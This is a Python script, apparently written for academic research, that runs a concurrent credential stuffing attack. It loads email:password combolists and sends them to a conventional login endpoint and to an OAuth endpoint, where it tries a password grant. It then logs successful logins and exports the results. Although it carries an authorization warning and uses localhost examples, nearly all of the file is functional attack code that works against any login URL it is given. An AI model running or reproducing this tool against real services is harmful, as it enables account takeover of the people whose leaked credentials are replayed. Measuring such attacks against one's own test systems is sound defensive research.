#!/usr/bin/env python3
"""
Credential Stuffing Simulation Script
Research Paper: "Mitigating Credential Stuffing in SME Web Applications"
Author: Academic Cybersecurity Research Team
Date: 2026

This script simulates a credential stuffing attack against both traditional
and OAuth 2.0 authentication endpoints for controlled research purposes.
"""

import asyncio
import aiohttp
import time
import json
import csv
import argparse
from typing import List, Dict, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import statistics
import sys


@dataclass
class AttackResult:
    """Data class to store individual attack attempt results"""
    timestamp: str
    endpoint_type: str  # "traditional" or "oauth"
    email: str
    success: bool
    status_code: int
    response_time_ms: float
    rejection_method: str  # e.g., "401 Unauthorized", "OAuth Invalid Grant", etc.
    error_message: str


class CredentialStuffingSimulator:
    """
    Professional-grade credential stuffing simulator for research purposes.
    Attacks both traditional login and OAuth 2.0 endpoints.
    """
    
    def __init__(self, base_url: str, traditional_endpoint: str, 
                 oauth_endpoint: str, combolist_path: str, 
                 max_requests: int = 500, concurrent_requests: int = 10):
        """
        Initialize the credential stuffing simulator.
        
        Args:
            base_url: Base URL of the target application (e.g., http://localhost:3000)
            traditional_endpoint: Endpoint for traditional login (e.g., /api/auth/login)
            oauth_endpoint: Endpoint for OAuth login (e.g., /api/auth/google)
            combolist_path: Path to the combolist file (CSV format)
            max_requests: Maximum number of requests to send
            concurrent_requests: Number of concurrent requests
        """
        self.base_url = base_url.rstrip('/')
        self.traditional_endpoint = traditional_endpoint
        self.oauth_endpoint = oauth_endpoint
        self.combolist_path = combolist_path
        self.max_requests = max_requests
        self.concurrent_requests = concurrent_requests
        self.results: List[AttackResult] = []
        
    def load_combolist(self) -> List[Tuple[str, str]]:
        """Load email:password combinations from file"""
        combos = []
        try:
            with open(self.combolist_path, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    email = row.get('email', '').strip()
                    password = row.get('password', '').strip()
                    if email and password:
                        combos.append((email, password))
                        if len(combos) >= self.max_requests:
                            break
        except Exception as e:
            print(f"[ERROR] Failed to load combolist: {e}")
            sys.exit(1)
            
        if not combos:
            print("[ERROR] No valid credentials found in combolist")
            sys.exit(1)
            
        print(f"[INFO] Loaded {len(combos)} credentials from combolist")
        return combos
    
    async def attack_traditional_endpoint(self, session: aiohttp.ClientSession, 
                                         email: str, password: str) -> AttackResult:
        """
        Simulate credential stuffing attack against traditional login endpoint.
        
        Expected payload structure:
        {
            "email": "user@example.com",
            "password": "password123"
        }
        """
        url = f"{self.base_url}{self.traditional_endpoint}"
        payload = {
            "email": email,
            "password": password
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        start_time = time.time()
        
        try:
            async with session.post(url, json=payload, headers=headers, 
                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                response_time = (time.time() - start_time) * 1000  # Convert to ms
                status_code = response.status
                
                try:
                    response_data = await response.json()
                except:
                    response_data = {}
                
                # Determine success based on status code
                success = status_code == 200
                
                # Determine rejection method
                if status_code == 401:
                    rejection_method = "401 Unauthorized - Invalid Credentials"
                elif status_code == 429:
                    rejection_method = "429 Too Many Requests - Rate Limited"
                elif status_code == 403:
                    rejection_method = "403 Forbidden - Account Locked"
                elif status_code == 400:
                    rejection_method = "400 Bad Request - Invalid Payload"
                elif status_code == 200:
                    rejection_method = "N/A - Login Successful"
                else:
                    rejection_method = f"{status_code} - Other"
                
                error_message = response_data.get('message', response_data.get('error', ''))
                
                return AttackResult(
                    timestamp=datetime.now().isoformat(),
                    endpoint_type="traditional",
                    email=email,
                    success=success,
                    status_code=status_code,
                    response_time_ms=round(response_time, 2),
                    rejection_method=rejection_method,
                    error_message=str(error_message)
                )
                
        except asyncio.TimeoutError:
            response_time = (time.time() - start_time) * 1000
            return AttackResult(
                timestamp=datetime.now().isoformat(),
                endpoint_type="traditional",
                email=email,
                success=False,
                status_code=0,
                response_time_ms=round(response_time, 2),
                rejection_method="Timeout",
                error_message="Request timeout"
            )
        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            return AttackResult(
                timestamp=datetime.now().isoformat(),
                endpoint_type="traditional",
                email=email,
                success=False,
                status_code=0,
                response_time_ms=round(response_time, 2),
                rejection_method="Connection Error",
                error_message=str(e)
            )
    
    async def attack_oauth_endpoint(self, session: aiohttp.ClientSession, 
                                   email: str, password: str) -> AttackResult:
        """
        Simulate credential stuffing attack against OAuth 2.0 endpoint.
        
        Note: OAuth endpoints typically don't accept username/password directly.
        This simulates an attacker trying to bypass OAuth by sending credentials
        to the callback or token exchange endpoint.
        
        Expected behavior: OAuth should reject all direct credential submissions.
        """
        url = f"{self.base_url}{self.oauth_endpoint}"
        
        # Attackers might try various OAuth bypass techniques
        # 1. Try to POST credentials directly to OAuth endpoint
        payload = {
            "email": email,
            "password": password,
            "grant_type": "password"  # Attempting Resource Owner Password Credentials
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        start_time = time.time()
        
        try:
            async with session.post(url, json=payload, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                response_time = (time.time() - start_time) * 1000
                status_code = response.status
                
                try:
                    response_data = await response.json()
                except:
                    response_data = {}
                
                # OAuth endpoints should NEVER accept direct credentials
                # Any 200 response here would be a severe security flaw
                success = status_code == 200
                
                # Determine rejection method
                if status_code == 400:
                    rejection_method = "400 Bad Request - OAuth Invalid Request"
                elif status_code == 401:
                    rejection_method = "401 Unauthorized - OAuth Invalid Client"
                elif status_code == 403:
                    rejection_method = "403 Forbidden - OAuth Access Denied"
                elif status_code == 302:
                    rejection_method = "302 Redirect - OAuth Flow Required"
                elif status_code == 404:
                    rejection_method = "404 Not Found - Endpoint Not Accepting Credentials"
                elif status_code == 405:
                    rejection_method = "405 Method Not Allowed - OAuth Requires Redirect Flow"
                elif status_code == 200:
                    rejection_method = "N/A - CRITICAL SECURITY FLAW: OAuth Accepted Direct Credentials"
                else:
                    rejection_method = f"{status_code} - OAuth Other Response"
                
                error_message = response_data.get('error', response_data.get('message', ''))
                
                return AttackResult(
                    timestamp=datetime.now().isoformat(),
                    endpoint_type="oauth",
                    email=email,
                    success=success,
                    status_code=status_code,
                    response_time_ms=round(response_time, 2),
                    rejection_method=rejection_method,
                    error_message=str(error_message)
                )
                
        except asyncio.TimeoutError:
            response_time = (time.time() - start_time) * 1000
            return AttackResult(
                timestamp=datetime.now().isoformat(),
                endpoint_type="oauth",
                email=email,
                success=False,
                status_code=0,
                response_time_ms=round(response_time, 2),
                rejection_method="Timeout",
                error_message="Request timeout"
            )
        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            return AttackResult(
                timestamp=datetime.now().isoformat(),
                endpoint_type="oauth",
                email=email,
                success=False,
                status_code=0,
                response_time_ms=round(response_time, 2),
                rejection_method="Connection Error",
                error_message=str(e)
            )
    
    async def run_attack_batch(self, combos: List[Tuple[str, str]]):
        """Run credential stuffing attacks in batches"""
        connector = aiohttp.TCPConnector(limit=self.concurrent_requests)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            
            for email, password in combos:
                # Attack both endpoints with the same credentials
                tasks.append(self.attack_traditional_endpoint(session, email, password))
                tasks.append(self.attack_oauth_endpoint(session, email, password))
            
            # Execute all attacks
            print(f"\n[INFO] Launching {len(tasks)} attack requests...")
            print(f"[INFO] Concurrent requests: {self.concurrent_requests}")
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Filter out exceptions and store valid results
            for result in results:
                if isinstance(result, AttackResult):
                    self.results.append(result)
                elif isinstance(result, Exception):
                    print(f"[WARN] Exception during attack: {result}")
    
    def calculate_metrics(self) -> Dict:
        """Calculate and return attack metrics"""
        if not self.results:
            return {}
        
        # Separate results by endpoint type
        traditional_results = [r for r in self.results if r.endpoint_type == "traditional"]
        oauth_results = [r for r in self.results if r.endpoint_type == "oauth"]
        
        def calc_endpoint_metrics(results: List[AttackResult], endpoint_name: str) -> Dict:
            if not results:
                return {}
            
            total_requests = len(results)
            successful_attacks = sum(1 for r in results if r.success)
            failed_attacks = total_requests - successful_attacks
            
            # Calculate response times
            response_times = [r.response_time_ms for r in results if r.response_time_ms > 0]
            avg_response_time = statistics.mean(response_times) if response_times else 0
            min_response_time = min(response_times) if response_times else 0
            max_response_time = max(response_times) if response_times else 0
            
            # Calculate success rate
            success_rate = (successful_attacks / total_requests * 100) if total_requests > 0 else 0
            
            # Collect rejection methods
            rejection_methods = {}
            for result in results:
                method = result.rejection_method
                rejection_methods[method] = rejection_methods.get(method, 0) + 1
            
            return {
                "endpoint": endpoint_name,
                "total_requests": total_requests,
                "successful_logins": successful_attacks,
                "failed_logins": failed_attacks,
                "success_rate_percentage": round(success_rate, 2),
                "avg_response_time_ms": round(avg_response_time, 2),
                "min_response_time_ms": round(min_response_time, 2),
                "max_response_time_ms": round(max_response_time, 2),
                "rejection_methods": rejection_methods
            }
        
        traditional_metrics = calc_endpoint_metrics(traditional_results, "Traditional Login")
        oauth_metrics = calc_endpoint_metrics(oauth_results, "OAuth 2.0 Login")
        
        return {
            "attack_summary": {
                "total_credentials_tested": len(set(r.email for r in self.results)) // 2,
                "total_requests_sent": len(self.results),
                "attack_duration_seconds": round(
                    (datetime.fromisoformat(self.results[-1].timestamp) - 
                     datetime.fromisoformat(self.results[0].timestamp)).total_seconds(), 2
                ) if len(self.results) > 1 else 0
            },
            "traditional_login_metrics": traditional_metrics,
            "oauth_login_metrics": oauth_metrics,
            "comparative_analysis": {
                "attack_mitigation_rate": {
                    "traditional": f"{100 - traditional_metrics.get('success_rate_percentage', 0):.2f}%",
                    "oauth": f"{100 - oauth_metrics.get('success_rate_percentage', 0):.2f}%"
                },
                "performance_comparison": {
                    "traditional_avg_ms": traditional_metrics.get('avg_response_time_ms', 0),
                    "oauth_avg_ms": oauth_metrics.get('avg_response_time_ms', 0),
                    "performance_delta_ms": round(
                        oauth_metrics.get('avg_response_time_ms', 0) - 
                        traditional_metrics.get('avg_response_time_ms', 0), 2
                    )
                }
            }
        }
    
    def export_results_csv(self, filename: str = "attack_results.csv"):
        """Export detailed results to CSV"""
        if not self.results:
            print("[WARN] No results to export")
            return
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            fieldnames = ['timestamp', 'endpoint_type', 'email', 'success', 
                         'status_code', 'response_time_ms', 'rejection_method', 
                         'error_message']
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            
            for result in self.results:
                writer.writerow(asdict(result))
        
        print(f"\n[SUCCESS] Detailed results exported to: {filename}")
    
    def export_metrics_json(self, filename: str = "attack_metrics.json"):
        """Export metrics to JSON"""
        metrics = self.calculate_metrics()
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(metrics, f, indent=2)
        
        print(f"[SUCCESS] Metrics exported to: {filename}")
    
    def print_summary(self):
        """Print summary to console"""
        metrics = self.calculate_metrics()
        
        print("\n" + "="*80)
        print(" CREDENTIAL STUFFING SIMULATION - FINAL RESULTS")
        print("="*80)
        
        print("\n[ATTACK SUMMARY]")
        summary = metrics.get('attack_summary', {})
        print(f"  • Total Credentials Tested: {summary.get('total_credentials_tested', 0)}")
        print(f"  • Total Requests Sent: {summary.get('total_requests_sent', 0)}")
        print(f"  • Attack Duration: {summary.get('attack_duration_seconds', 0)} seconds")
        
        print("\n[TRADITIONAL LOGIN ENDPOINT]")
        trad = metrics.get('traditional_login_metrics', {})
        print(f"  • Total Requests: {trad.get('total_requests', 0)}")
        print(f"  • Successful Logins: {trad.get('successful_logins', 0)}")
        print(f"  • Failed Logins: {trad.get('failed_logins', 0)}")
        print(f"  • Attack Success Rate: {trad.get('success_rate_percentage', 0)}%")
        print(f"  • Avg Response Time: {trad.get('avg_response_time_ms', 0)} ms")
        print(f"\n  Rejection Methods:")
        for method, count in trad.get('rejection_methods', {}).items():
            print(f"    - {method}: {count}")
        
        print("\n[OAUTH 2.0 LOGIN ENDPOINT]")
        oauth = metrics.get('oauth_login_metrics', {})
        print(f"  • Total Requests: {oauth.get('total_requests', 0)}")
        print(f"  • Successful Logins: {oauth.get('successful_logins', 0)}")
        print(f"  • Failed Logins: {oauth.get('failed_logins', 0)}")
        print(f"  • Attack Success Rate: {oauth.get('success_rate_percentage', 0)}%")
        print(f"  • Avg Response Time: {oauth.get('avg_response_time_ms', 0)} ms")
        print(f"\n  Rejection Methods:")
        for method, count in oauth.get('rejection_methods', {}).items():
            print(f"    - {method}: {count}")
        
        print("\n[COMPARATIVE ANALYSIS]")
        comp = metrics.get('comparative_analysis', {})
        print(f"  • Traditional Mitigation Rate: {comp.get('attack_mitigation_rate', {}).get('traditional', 'N/A')}")
        print(f"  • OAuth Mitigation Rate: {comp.get('attack_mitigation_rate', {}).get('oauth', 'N/A')}")
        print(f"\n  Performance Comparison:")
        perf = comp.get('performance_comparison', {})
        print(f"    - Traditional Avg: {perf.get('traditional_avg_ms', 0)} ms")
        print(f"    - OAuth Avg: {perf.get('oauth_avg_ms', 0)} ms")
        print(f"    - Delta: {perf.get('performance_delta_ms', 0)} ms")
        
        print("\n" + "="*80 + "\n")


def generate_sample_combolist(filename: str = "sample_combolist.csv", count: int = 100):
    """Generate a sample combolist for testing"""
    print(f"[INFO] Generating sample combolist with {count} entries...")
    
    # Mix of realistic fake credentials (for simulation only)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    passwords = [
        'password123', '123456', 'qwerty', 'letmein', 'welcome',
        'admin123', 'test1234', 'Password1', '12345678', 'abc123'
    ]
    
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['email', 'password'])
        writer.writeheader()
        
        for i in range(count):
            email = f"user{i}@{domains[i % len(domains)]}"
            password = passwords[i % len(passwords)]
            writer.writerow({'email': email, 'password': password})
    
    print(f"[SUCCESS] Sample combolist generated: {filename}")


def main():
    parser = argparse.ArgumentParser(
        description='Credential Stuffing Simulator for Research Purposes',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate sample combolist
  python credential_stuffer.py --generate-combolist --count 200
  
  # Run attack simulation
  python credential_stuffer.py \\
    --url http://localhost:3000 \\
    --traditional /api/auth/login \\
    --oauth /api/auth/google \\
    --combolist sample_combolist.csv \\
    --max-requests 100
        """
    )
    
    parser.add_argument('--url', type=str, 
                       help='Base URL of target application (e.g., http://localhost:3000)')
    parser.add_argument('--traditional', type=str,
                       help='Traditional login endpoint (e.g., /api/auth/login)')
    parser.add_argument('--oauth', type=str,
                       help='OAuth login endpoint (e.g., /api/auth/google)')
    parser.add_argument('--combolist', type=str,
                       help='Path to combolist CSV file')
    parser.add_argument('--max-requests', type=int, default=100,
                       help='Maximum number of credential pairs to test (default: 100)')
    parser.add_argument('--concurrent', type=int, default=10,
                       help='Number of concurrent requests (default: 10)')
    parser.add_argument('--generate-combolist', action='store_true',
                       help='Generate a sample combolist file')
    parser.add_argument('--count', type=int, default=100,
                       help='Number of entries in generated combolist (default: 100)')
    parser.add_argument('--output-csv', type=str, default='attack_results.csv',
                       help='Output CSV file for detailed results')
    parser.add_argument('--output-json', type=str, default='attack_metrics.json',
                       help='Output JSON file for metrics')
    
    args = parser.parse_args()
    
    # Generate combolist if requested
    if args.generate_combolist:
        generate_sample_combolist('sample_combolist.csv', args.count)
        return
    
    # Validate required arguments for attack
    if not all([args.url, args.traditional, args.oauth, args.combolist]):
        parser.error("--url, --traditional, --oauth, and --combolist are required for attack simulation")
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║         CREDENTIAL STUFFING SIMULATION - RESEARCH ENVIRONMENT               ║
║                                                                              ║
║  WARNING: This tool is for authorized research purposes only.               ║
║  Do not use against systems you do not own or have permission to test.     ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    # Initialize simulator
    simulator = CredentialStuffingSimulator(
        base_url=args.url,
        traditional_endpoint=args.traditional,
        oauth_endpoint=args.oauth,
        combolist_path=args.combolist,
        max_requests=args.max_requests,
        concurrent_requests=args.concurrent
    )
    
    # Load credentials
    combos = simulator.load_combolist()
    
    # Run attack simulation
    print(f"\n[INFO] Target URL: {args.url}")
    print(f"[INFO] Traditional Endpoint: {args.traditional}")
    print(f"[INFO] OAuth Endpoint: {args.oauth}")
    print(f"[INFO] Starting simulation...\n")
    
    try:
        asyncio.run(simulator.run_attack_batch(combos))
    except KeyboardInterrupt:
        print("\n[WARN] Attack simulation interrupted by user")
    
    # Generate and display results
    simulator.print_summary()
    simulator.export_results_csv(args.output_csv)
    simulator.export_metrics_json(args.output_json)
    
    print("\n[INFO] Simulation complete!")


if __name__ == "__main__":
    main()
